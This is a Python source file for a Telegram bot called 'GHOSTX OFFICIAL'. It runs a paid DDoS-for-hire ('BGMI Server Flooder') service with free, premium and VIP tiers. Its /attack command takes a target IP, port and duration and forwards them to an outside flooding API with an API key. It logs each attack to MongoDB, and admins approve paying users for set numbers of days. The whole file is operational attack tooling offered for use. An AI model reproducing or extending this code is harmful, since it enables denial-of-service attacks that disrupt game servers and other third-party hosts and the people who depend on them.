# bot.py - GHOSTX OFFICIAL (Railway optimized - no .env file)

import asyncio
import logging
from datetime import datetime, timedelta, timezone
from typing import Dict, Optional, List
import requests
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
import pymongo
from pymongo import MongoClient, ASCENDING, DESCENDING
from functools import wraps
import uuid
import os

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ============================================================
# CONFIGURATION - READ FROM RAILWAY ENV VARS
# ============================================================

BOT_TOKEN = os.environ.get("BOT_TOKEN")
MONGODB_URI = os.environ.get("MONGODB_URI")
DATABASE_NAME = os.environ.get("DATABASE_NAME", "attack_bot")
API_URL = os.environ.get("API_URL", "https://ghostxfloder-production.up.railway.app")
API_KEY = os.environ.get("API_KEY", "ghostx_official")
ADMIN_IDS = [int(id.strip()) for id in os.environ.get("ADMIN_IDS", "5231119862").split(",")]

# Blocked ports for API
BLOCKED_PORTS = {8700, 20000, 443, 17500, 9031, 20002, 20001}
MIN_PORT = 1
MAX_PORT = 65535

# TIER CONFIGURATION
TIER_CONFIG = {
    "free": {"max_duration": 180, "name": "🔓 Free", "concurrent": 1},
    "premium": {"max_duration": 600, "name": "💎 Premium", "concurrent": 3},
    "vip": {"max_duration": 900, "name": "👑 VIP", "concurrent": 5}
}
DEFAULT_TIER = "free"

# ============================================================
# DATABASE CLASS
# ============================================================

def make_aware(dt):
    if dt is None:
        return None
    if hasattr(dt, 'tzinfo') and dt.tzinfo is None:
        return dt.replace(tzinfo=timezone.utc)
    return dt

def get_current_time():
    return datetime.now(timezone.utc)

class Database:
    def __init__(self):
        self.client = MongoClient(MONGODB_URI)
        self.db = self.client[DATABASE_NAME]
        self.users = self.db.users
        self.attacks = self.db.attacks
        
        try:
            self.users.delete_many({"user_id": None})
            self.users.delete_many({"user_id": {"$exists": False}})
        except:
            pass
        
        try:
            self.users.drop_indexes()
        except:
            pass
        
        self.users.create_index([("user_id", ASCENDING)], unique=True, sparse=True)
        self.attacks.create_index([("timestamp", DESCENDING)])
        self.attacks.create_index([("user_id", ASCENDING)])
        
    def get_user(self, user_id: int) -> Optional[Dict]:
        user = self.users.find_one({"user_id": user_id})
        if user:
            if user.get("created_at"):
                user["created_at"] = make_aware(user["created_at"])
            if user.get("approved_at"):
                user["approved_at"] = make_aware(user["approved_at"])
            if user.get("expires_at"):
                user["expires_at"] = make_aware(user["expires_at"])
        return user
    
    def create_user(self, user_id: int, username: str = None) -> Dict:
        existing_user = self.get_user(user_id)
        if existing_user:
            return existing_user
            
        user_data = {
            "user_id": user_id,
            "username": username,
            "approved": False,
            "approved_at": None,
            "expires_at": None,
            "total_attacks": 0,
            "created_at": get_current_time(),
            "is_banned": False,
            "tier": DEFAULT_TIER
        }
        try:
            self.users.insert_one(user_data)
        except pymongo.errors.DuplicateKeyError:
            user_data = self.get_user(user_id)
        return user_data
    
    def approve_user(self, user_id: int, days: int) -> bool:
        expires_at = get_current_time() + timedelta(days=days)
        result = self.users.update_one(
            {"user_id": user_id},
            {"$set": {"approved": True, "approved_at": get_current_time(), "expires_at": expires_at}}
        )
        return result.modified_count > 0
    
    def disapprove_user(self, user_id: int) -> bool:
        result = self.users.update_one(
            {"user_id": user_id},
            {"$set": {"approved": False, "expires_at": None}}
        )
        return result.modified_count > 0
    
    def set_user_tier(self, user_id: int, tier: str) -> bool:
        if tier not in TIER_CONFIG:
            return False
        result = self.users.update_one({"user_id": user_id}, {"$set": {"tier": tier}})
        return result.modified_count > 0
    
    def get_user_tier(self, user_id: int) -> str:
        user = self.get_user(user_id)
        return user.get("tier", DEFAULT_TIER) if user else DEFAULT_TIER
    
    def get_user_max_duration(self, user_id: int) -> int:
        tier = self.get_user_tier(user_id)
        return TIER_CONFIG.get(tier, TIER_CONFIG[DEFAULT_TIER])["max_duration"]
    
    def log_attack(self, user_id: int, ip: str, port: int, duration: int, status: str, response: str = None):
        attack_data = {
            "_id": str(uuid.uuid4()),
            "user_id": user_id,
            "ip": ip,
            "port": port,
            "duration": duration,
            "status": status,
            "response": response[:500] if response else None,
            "timestamp": get_current_time()
        }
        self.attacks.insert_one(attack_data)
        self.users.update_one({"user_id": user_id}, {"$inc": {"total_attacks": 1}})
    
    def get_all_users(self) -> List[Dict]:
        return list(self.users.find({"user_id": {"$ne": None, "$exists": True}}))
    
    def get_user_attack_stats(self, user_id: int) -> Dict:
        total = self.attacks.count_documents({"user_id": user_id})
        successful = self.attacks.count_documents({"user_id": user_id, "status": "success"})
        failed = self.attacks.count_documents({"user_id": user_id, "status": "failed"})
        recent = list(self.attacks.find({"user_id": user_id}).sort("timestamp", -1).limit(10))
        return {"total": total, "successful": successful, "failed": failed, "recent": recent}

db = Database()

# ============================================================
# HELPER FUNCTIONS
# ============================================================

def get_blocked_ports_list() -> str:
    return ", ".join(str(p) for p in sorted(BLOCKED_PORTS))

def admin_required(func):
    @wraps(func)
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        if update.effective_user.id not in ADMIN_IDS:
            await update.message.reply_text("❌ Admin only.")
            return
        return await func(update, context, *args, **kwargs)
    return wrapper

async def is_user_approved(user_id: int) -> bool:
    user = db.get_user(user_id)
    if not user or not user.get("approved"):
        return False
    expires_at = user.get("expires_at")
    if expires_at:
        if make_aware(expires_at) < get_current_time():
            return False
    return True

# ============================================================
# API FUNCTIONS
# ============================================================

def check_api_health():
    try:
        response = requests.get(f"{API_URL}/api/v1/health", timeout=10)
        if response.status_code == 200:
            return response.json()
        return {"status": "error"}
    except:
        return {"status": "error"}

def check_running_attacks():
    try:
        response = requests.get(f"{API_URL}/api/v1/active", timeout=10)
        if response.status_code == 200:
            return response.json()
        return {"success": False}
    except:
        return {"success": False}

def launch_attack(ip: str, port: int, duration: int):
    try:
        response = requests.post(
            f"{API_URL}/api/v1/attack",
            json={"ip": ip, "port": port, "duration": duration},
            headers={"x-api-key": API_KEY, "Content-Type": "application/json"},
            timeout=15
        )
        return response.json()
    except Exception as e:
        return {"error": str(e), "success": False}

# ============================================================
# COMMANDS
# ============================================================

@admin_required
async def approve_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if len(context.args) < 2:
            await update.message.reply_text("Usage: /approve <user_id> <days> [tier]")
            return
        user_id = int(context.args[0])
        days = int(context.args[1])
        tier = context.args[2].lower() if len(context.args) >= 3 else DEFAULT_TIER
        
        if tier not in TIER_CONFIG:
            await update.message.reply_text(f"Tiers: {', '.join(TIER_CONFIG.keys())}")
            return
        
        if not db.get_user(user_id):
            db.create_user(user_id)
        
        db.set_user_tier(user_id, tier)
        
        if db.approve_user(user_id, days):
            await update.message.reply_text(f"✅ User {user_id} approved as {TIER_CONFIG[tier]['name']} tier!")
    except:
        await update.message.reply_text("Error")

@admin_required
async def users_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    users = db.get_all_users()
    msg = f"👥 Users: {len(users)}\n"
    for u in users[:15]:
        tier = u.get("tier", "free")
        msg += f"{u['user_id']} - {tier} - {u.get('total_attacks',0)} attacks\n"
    await update.message.reply_text(msg)

@admin_required
async def settier_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = int(context.args[0])
        tier = context.args[1].lower()
        if tier not in TIER_CONFIG:
            await update.message.reply_text(f"Tiers: {', '.join(TIER_CONFIG.keys())}")
            return
        if db.set_user_tier(user_id, tier):
            await update.message.reply_text(f"✅ User {user_id} is now {TIER_CONFIG[tier]['name']} tier!")
    except:
        await update.message.reply_text("Usage: /settier userid tier")

@admin_required
async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    health = check_api_health()
    if health.get("status") == "ok":
        await update.message.reply_text(f"✅ API Online - {API_URL}")
    else:
        await update.message.reply_text("❌ API Offline")

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username
    db.create_user(user_id, username)
    
    if await is_user_approved(user_id):
        tier = db.get_user_tier(user_id)
        max_dur = db.get_user_max_duration(user_id)
        msg = f"🔥 GHOSTX OFFICIAL 🔥\n\n✅ Approved! Tier: {TIER_CONFIG[tier]['name']}\n⚔️ Max Attack: {max_dur}s\n\n/attack IP PORT DURATION\n/help"
    else:
        msg = "❌ Not approved. Contact @GhostXAdmin"
    await update.message.reply_text(msg)

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not await is_user_approved(user_id):
        await update.message.reply_text("❌ Not approved.")
        return
    
    if len(context.args) != 3:
        await update.message.reply_text("Usage: /attack IP PORT DURATION\nExample: /attack 1.2.3.4 8000 60")
        return
    
    ip = context.args[0]
    try:
        port = int(context.args[1])
        duration = int(context.args[2])
    except:
        await update.message.reply_text("❌ Port and duration must be numbers.")
        return
    
    max_dur = db.get_user_max_duration(user_id)
    if duration < 1 or duration > max_dur:
        await update.message.reply_text(f"❌ Duration max: {max_dur}s for your tier")
        return
    
    msg = await update.message.reply_text(f"💀 Attacking {ip}:{port} for {duration}s...")
    response = launch_attack(ip, port, duration)
    
    if response.get("success"):
        db.log_attack(user_id, ip, port, duration, "success", str(response))
        await msg.edit_text(f"✅ ATTACK LAUNCHED!\n🎯 {ip}:{port}\n⏱️ {duration}s")
    else:
        db.log_attack(user_id, ip, port, duration, "failed", str(response))
        await msg.edit_text(f"❌ Failed: {response.get('error', 'Unknown')}")

async def mytier_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    tier = db.get_user_tier(user_id)
    max_dur = db.get_user_max_duration(user_id)
    await update.message.reply_text(f"⭐ Your Tier: {TIER_CONFIG[tier]['name']}\n⚔️ Max Attack: {max_dur}s")

async def myinfo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = db.get_user(update.effective_user.id)
    if user:
        tier = user.get("tier", "free")
        await update.message.reply_text(f"🆔 ID: {user['user_id']}\n⭐ Tier: {TIER_CONFIG[tier]['name']}\n📊 Attacks: {user.get('total_attacks', 0)}")

async def myattacks_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    attacks = check_running_attacks()
    if attacks.get("success"):
        active = attacks.get("activeAttacks", [])
        if active:
            msg = "🎯 Active Attacks:\n" + "\n".join([f"• {a['target']} - {a['expiresIn']}s" for a in active[:5]])
            await update.message.reply_text(msg)
        else:
            await update.message.reply_text("✅ No active attacks.")
    else:
        await update.message.reply_text("❌ Cannot fetch attacks.")

async def mystats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stats = db.get_user_attack_stats(update.effective_user.id)
    await update.message.reply_text(f"📊 Your Stats\nTotal: {stats['total']}\n✅ Success: {stats['successful']}\n❌ Failed: {stats['failed']}")

async def blocked_ports_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"🚫 Blocked ports: {get_blocked_ports_list()}")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = """🔥 GHOSTX OFFICIAL 🔥

/start - Check status
/attack IP PORT SECONDS - Launch attack
/myinfo - Your info
/mytier - Your limits
/myattacks - Active attacks
/mystats - Your history
/blockedports - Blocked ports

💀 BGMI Server Flooder 💀"""
    await update.message.reply_text(msg)

async def running_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    attacks = check_running_attacks()
    if attacks.get("success"):
        active = attacks.get("activeAttacks", [])
        await update.message.reply_text(f"Active attacks: {len(active)}")
    else:
        await update.message.reply_text("Cannot fetch")

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    users = db.get_all_users()
    await update.message.reply_text(f"Total users: {len(users)}")

# ============================================================
# MAIN
# ============================================================

def main():
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Admin
    application.add_handler(CommandHandler("approve", approve_command))
    application.add_handler(CommandHandler("users", users_command))
    application.add_handler(CommandHandler("settier", settier_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("running", running_command))
    application.add_handler(CommandHandler("stats", stats_command))
    
    # User
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("attack", attack_command))
    application.add_handler(CommandHandler("myinfo", myinfo_command))
    application.add_handler(CommandHandler("mytier", mytier_command))
    application.add_handler(CommandHandler("myattacks", myattacks_command))
    application.add_handler(CommandHandler("mystats", mystats_command))
    application.add_handler(CommandHandler("blockedports", blocked_ports_command))
    application.add_handler(CommandHandler("help", help_command))
    
    print(f"🔥 GHOSTX BOT RUNNING - API: {API_URL} 🔥")
    application.run_polling()

if __name__ == "__main__":
    main()
